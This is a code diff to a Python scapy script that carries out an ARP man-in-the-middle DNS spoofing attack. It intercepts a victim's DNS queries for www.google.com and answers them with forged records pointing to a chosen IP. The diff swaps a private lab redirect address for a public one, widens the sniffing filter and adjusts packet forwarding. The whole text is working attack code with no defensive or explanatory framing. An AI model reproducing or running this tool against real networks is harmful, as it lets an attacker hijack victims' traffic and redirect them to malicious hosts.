@@ -6,7 +6,7 @@ import sys, time, multiprocessing
 DIVIDER = '=' * 60
 POISON_BREAK = 30
 SPOOF_DOMAIN_NAME = 'www.google.com'
-REDIRECT_IP = '192.168.56.102'
+REDIRECT_IP = '93.184.216.34'
 
 # ARP Man in the Middle DNS Spoofing Attack
 class ARPMITMDNSSpoofing():
@@ -76,19 +76,20 @@ class ARPMITMDNSSpoofing():
 
     # Sniffs incoming packets
     def sniffIncomingPackets(self):
-        bpfFilter = 'ip host {}'.format(self.victimIP) 
+        bpfFilter = '(not ip host 10.0.2.4) and not arp and not ip host 127.0.0.1'
         incomingPackets = scapy.sniff(filter = bpfFilter, prn = self.dnsSpoof)
 
     # DNS spoof packets
     def dnsSpoof(self, packet):
+        print(packet.summary())
         if (packet.haslayer(scapy.DNS)):
             # Initialize packet layers
             packetDNSLayer = packet.getlayer(scapy.DNS)
             isRightDomain = packetDNSLayer.qd.qname == SPOOF_DOMAIN_NAME + '.'
             isDNSRequest = packetDNSLayer.qr == 0
-            print(packetDNSLayer.qd.qname)
+            #print(packetDNSLayer.qd.qname)
             if isDNSRequest and isRightDomain:
-                print("{} was requested".format(SPOOF_DOMAIN_NAME))
+                print("The spoofed domain ({}) was requested".format(SPOOF_DOMAIN_NAME))
                 # Original packet layers
                 packetIPLayer = packet.getlayer(scapy.IP)
                 packetUDPLayer = packet.getlayer(scapy.UDP)
@@ -107,7 +108,10 @@ class ARPMITMDNSSpoofing():
                                                 rdata = REDIRECT_IP))
 
                 packet = spoofedIPLayer/spoofedUDPLayer/spoofedDNSLayer # Assemble and assign spoofed packet
-        scapy.send(packet)
+                scapy.send(packet)
+            else:
+                scapy.sendp(packet)
+        scapy.sendp(packet)
 
     # Clean ARP tables of the victims
     def clean(self):
